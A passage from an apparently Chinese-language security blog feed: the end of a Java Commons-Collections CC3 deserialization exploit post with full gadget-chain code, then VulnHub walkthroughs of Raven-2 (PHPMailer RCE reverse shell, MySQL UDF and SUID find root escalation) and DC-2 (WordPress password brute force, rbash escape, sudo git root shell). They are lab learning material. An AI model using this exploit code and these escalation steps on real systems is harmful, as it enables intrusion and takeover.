</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);  </span></span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  instantiateTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandler解决proxyMap不能序列化，然后通过构造方法将代理对象proxyMap赋值给memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化与反序列化  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是发现在反序列化的时候报错，这里还是CC1的<code>setValue()</code> 的传参无法控制，需要引入 <code>Transformer</code> 与 <code>ChainedTransformer</code> 辅助，改了后的EXP如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandler解决proxyMap不能序列化，然后通过构造方法将代理对象proxyMap赋值给memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化与反序列化  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737151.png" alt="image-20230603173731054"><br>链子结束。跟完发现自己对于CC1的理解还是不够透彻，得去复习一下了，CC链这一块还是很重要，对于后续其它的链学习算是打下基础</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737924.png" alt="image-20230603173740854"><br>这条链子就相当于给了命令执行的另一种方法，如果<code>InvokerTransform</code>和<code>Runtime</code>被办了就可以用这一条来绕过</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-Raven-2</title>
      <link href="/undefined/8725.html"/>
      <url>/undefined/8725.html</url>
      
        <content type="html"><![CDATA[<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><code>https://www.vulnhub.com/entry/raven-2,269/</code></p><h2 id="flag—1"><a href="#flag—1" class="headerlink" title="flag—1"></a>flag—1</h2><p>扫描存活主机<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511958.png" alt="image-20230530151117902"><br>通过靶机mac地址判断IP为<code>192.168.75.135</code>然后nmap扫一下，看看开放端口<br><code>nmap -A -p- -v  192.168.75.135</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511132.png" alt="image-20230530151136092"><br>三个开放端口，然后dirsearch扫一下目录<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301511273.png" alt="image-20230530151147237"><br>访问&#x2F;vendor存在一个目录遍历漏洞，在PATH下找到flag1<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512438.png" alt="image-20230530151208411"></p><h2 id="flag—2，3"><a href="#flag—2，3" class="headerlink" title="flag—2，3"></a>flag—2，3</h2><p>访问README.md发现存在一个phpmailer服务，并且在VERSION下看的版本为5.2.16搜了一下18以下存在<strong>PHPMailer远程命令执行漏洞</strong>本来想手工利用，但是失败了，直接利用<strong>searchsploit</strong>搜索可以利用的漏洞<br><code>searchsploit PHPMailer</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512376.png" alt="image-20230530151222302"><br>将python那条exp拷贝出来，然后修改目标地址和反弹shell的地址以及上传的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/40974.py /home/joker27/桌面</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512462.png" alt="image-20230530151238409"><br>然后执行exp生成后门文件<br><code>python 40974.py</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512317.png" alt="image-20230530151254251"><br>监听端口，先访问<a href="http://192.168.75.135/contact.php%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AE%BF%E9%97%AE%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9%E6%88%90%E5%8A%9F">http://192.168.75.135/contact.php生成后门文件，然后访问后门文件反弹成功</a><br>使用python获得一个交互式shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>查看权限，是一个www-data权限很低<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513510.png" alt="image-20230530151311480"><br>使用命令<code>find / -name &quot;flag*&quot;</code>直接搜索flag，查到flag2和3<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513241.png" alt="image-20230530151323212"><br>flag2直接命令打开就行，flag3是一张图片在web下访问<code>http://192.168.75.135/wordpress/wp-content/uploads/2018/11/flag3.png</code>即可得到，最后一个flag肯定就要提权了</p><h2 id="flag–4-udf提权"><a href="#flag–4-udf提权" class="headerlink" title="flag–4(udf提权)"></a>flag–4(udf提权)</h2><p>以前只了解但是没玩过udf提权也是拿这个靶场练练<br>使用LinEnum.sh对Linux进行信息搜集，项目地址：<code>https://github.com/rebootuser/LinEnum</code><br>利用python起一个临时web服务，python3下运行<code>python -m http.server</code><br>服务默认端口8000，利用这个服务将LinEnum.sh文件上传到靶机上运行，这个方法在<strong>Vulnhub——Ai-Web1</strong>也有运用，不知道的可以参考我前面的文章，然后使用wget远程下载sh文件<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513476.png" alt="image-20230530151348411"><br>然后运行这个文件，需要加权运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514588.png" alt="image-20230530151402551"><br>出来的信息很多，发现mysql是在root下运行的，其实也可以执行命令<code>ps aux | grep root</code>查看以root运行的进程<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514838.png" alt="image-20230530151412795"><br>所以如果数据库版本不是很高(&lt;&#x3D; 5.7.14，5.6.32，5.5.51)就可以用udf来提权，就下来就是想办法得到数据库版本，最终在如下配置文件得到mysql的账号密码<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514005.png" alt="image-20230530151425953"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514656.png" alt="image-20230530151438618"><br>连接数据库<code>mysql -uroot -pR@v3nSecurity</code><br>查询数据库版本<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514125.png" alt="image-20230530151450089"><br><strong>查看 secure_file_priv  的值</strong><br>secure_file_priv 是用来限制 load dumpfile、into  outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line">     当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权</span><br><span class="line">     当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时可能也无法提权</span><br><span class="line">     当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515020.png" alt="image-20230530151509989"><br>可以使用udf提权，并且导出没做限制，kali使用命令<code>searchsploit mysql</code> 找到利用exp<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515647.png" alt="image-20230530151520614"><br>将exp复制生成<code>.so</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/1518.c //home/joker27/桌面</span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o udf.so 1518.o -lc</span><br><span class="line"></span><br><span class="line">参数含义</span><br><span class="line">-g 生成调试信息</span><br><span class="line">-c 编译（二进制）</span><br><span class="line">-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。</span><br><span class="line">-o：执行命令后的文件名</span><br><span class="line">-lc：-l 库 c库名</span><br></pre></td></tr></table></figure><p>同样用python的临时服务将<code>.so</code>文件上传到靶机，接下来的步骤就是自定义一个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line"></span><br><span class="line">//创建一个表并且包含一个blob型(blob型用于储存大型二进制对象)的列</span><br><span class="line">create table foo(line blob);</span><br><span class="line"></span><br><span class="line">//将udf.so文件插入表中</span><br><span class="line">insert into foo values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"></span><br><span class="line">//将二进制数据导出到plugin目录下</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">//创建自定义函数do_system，类型为integer，别名udf.so</span><br><span class="line">create function do_system returns integer soname &#x27;udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">//查询是否创建成功</span><br><span class="line">select * from mysql.func;</span><br><span class="line"></span><br><span class="line">//利用自定义函数改变find命令权限</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"></span><br><span class="line">//使用find提权</span><br><span class="line">touch hello</span><br><span class="line">find hello -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p>z这里再温习一遍find提权，就是随便查找一个文件，当然这个文件得存在，对查找到的利用参数<code>-exec</code>执行一个shell命令，由于find是以root运行的所以这个shell自然也就是root了<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515774.png" alt="image-20230530151533731"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515043.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-2</title>
      <link href="/undefined/35498.html"/>
      <url>/undefined/35498.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址：<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>下载完后就一个ova文件，Vmware打开就行</p><h2 id="flag–1"><a href="#flag–1" class="headerlink" title="flag–1"></a>flag–1</h2><p>老步骤，扫描存活IP<br><code>arp-scan -l</code><br>通过mac地址判断IP为192.168.75.134<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071823280.png" alt="image-20230507182024787"><br>nmap查看全部端口，-v为查看版本号<br><code>nmap -A -p- -v 192.168.75.134</code><br>有一个80端口，还有一个7744放了ssh<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071824518.png" alt="image-20230507182437450"><br>访问IP的时候发现访问失败，并且重定向到域名<code>dc-2</code>原因为本地无法解析域名，所以需要编辑&#x2F;etc&#x2F;hosts文件，添加靶机IP地址及对应域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.75.134  dc-2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071824150.png" alt="image-20230507182457099"><br>由于是在kali下写入所以只能在kali下访问，然后在页面找到flag1<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825846.png" alt="image-20230507182506788"><br>然后根据提示下一个flag要使用kali下的cewl，并且需要登录，所以待会儿要扫一下目录</p><h2 id="flag–2"><a href="#flag–2" class="headerlink" title="flag–2"></a>flag–2</h2><p>先使用cewl生成一下密码字典<br><code>cewl dc-2 -w dict.txt</code><br>然后使用WPscan枚举一下用户<br><code>wpscan --url dc-2 --enumerate u</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825397.png" alt="image-20230507182519333"><br>得到三个用户，然后使用一开始生成的字典进行爆破<br><code>wpscan --url dc-2 --passwords dict.txt</code><br>得到两个账号的密码<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825746.png" alt="image-20230507182535717"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p>然后扫一下后台<code>dirb http://dc-2/ </code>得到登录地址为&#x2F;wp-admin，利用账号登录找到flag2<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825804.png" alt="image-20230507182547769"></p><h2 id="flag–3"><a href="#flag–3" class="headerlink" title="flag–3"></a>flag–3</h2><p>然后利用一下之前扫的ssh服务，用tom的账号登一下<br><code>ssh tom@192.168.75.134 -p 7744</code>密码就是之前那个密码，然后ls可以看到flag，但是这里做了rbash限制，最终使用vi打开得到flag3<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826231.png" alt="image-20230507182601203"></p><h2 id="flag–4"><a href="#flag–4" class="headerlink" title="flag–4"></a>flag–4</h2><p>根据flag3提示切换到另一个用户，但是这里用不了su命令，用了rbash包裹得绕过一下<br>先简单看一下rbash是什么</p><h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>rbash(The restricted mode of bash),也就是限制型bash；是平时所谓的 restricted shell的一种，也是最常见的 restricted shell（rbash、ksh、rsh等）渗透中遇到restricted shell是一件很烦人的事，总有有一种束手束脚的感觉；下面我们就来看看如何突破它。</p><h3 id="0x01、rbash中的限制（正因为有这些限制我们才要突破它）"><a href="#0x01、rbash中的限制（正因为有这些限制我们才要突破它）" class="headerlink" title="0x01、rbash中的限制（正因为有这些限制我们才要突破它）"></a>0x01、rbash中的限制（正因为有这些限制我们才要突破它）</h3><ul><li>不能使用cd命令（意味着不能更改目录）</li><li>不能设置或取消环境变量：SHELL， PATH， ENV， BASH_ENV</li><li>导入功能受限</li><li>指定包含参数’&#x2F;‘或’-‘的文件名(即命名中不能包含 ‘&#x2F; ‘ 或’-‘)</li><li>不能使用使用 &gt;，&gt;|， &lt;&gt;， &gt;&amp;， &amp;&gt;， &gt;&gt; 等重定向操作符</li><li>不能使用’set + r’或’set + o’关闭<br>从上边这些限制可知rbash的存在是为了提高安全性，但是严重影响了我们在目标机器上的信息收集，以及常用的反弹shell(大部分需要用到重定向符)<br>这里绕过方法很多，我直接用wp的方法<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh  #调用/bin/sh命令解释器</span><br><span class="line">a  </span><br><span class="line">/bin/bash   #使用bash命令解释器</span><br><span class="line">export PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbin  #设置环境变量</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826226.png" alt="image-20230507182618182"><br>切换成功，然后进入jerry目录下得到flag4<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826271.png" alt="image-20230507182628216"></li></ul><h2 id="flag–5"><a href="#flag–5" class="headerlink" title="flag–5"></a>flag–5</h2><p>通过flag4提示使用git提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l    #查看可以使用root权限无密码的命令，有git命令</span><br><span class="line">sudo git -p help #强制进入交互状态</span><br><span class="line">!/bin/bash #打开一个用户为root的shell</span><br><span class="line"></span><br><span class="line">法2：</span><br><span class="line">sudo git help config #在末行命令模式输入</span><br><span class="line">!/bin/bash 或者 !&#x27;sh&#x27; #打开一个用户为root的shell</span><br></pre></td></tr></table></figure><p>提权成功，拿到最后一个flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826622.png" alt="image-20230507182637547"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CC链6</title>
